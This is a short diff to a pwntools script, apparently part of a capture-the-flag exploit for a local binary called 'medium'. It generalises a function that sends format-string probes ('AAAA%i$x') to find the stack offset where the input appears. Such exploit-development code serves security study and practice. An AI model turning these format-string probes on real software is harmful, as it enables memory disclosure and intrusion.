@@ -2,11 +2,11 @@ from pwn import *
 
 context.log_level = 'error'
 
-def find_offset():
+def find_offset(binary, after):
     for i in range(1, 20):
-        p = process('./medium')
+        p = process(binary)
 
-        p.sendlineafter(b':\n', f'AAAA%{i}$x'.encode())
+        p.sendlineafter(after, f'AAAA%{i}$x'.encode())
         output = p.recvline().decode('utf-8')
 
         p.close()
@@ -14,7 +14,7 @@ def find_offset():
         if '41414141' in output:
             return i
 
-offset = find_offset()
+offset = find_offset('./medium', b':\n')
 
 p = process('./medium')
 e = p.elf
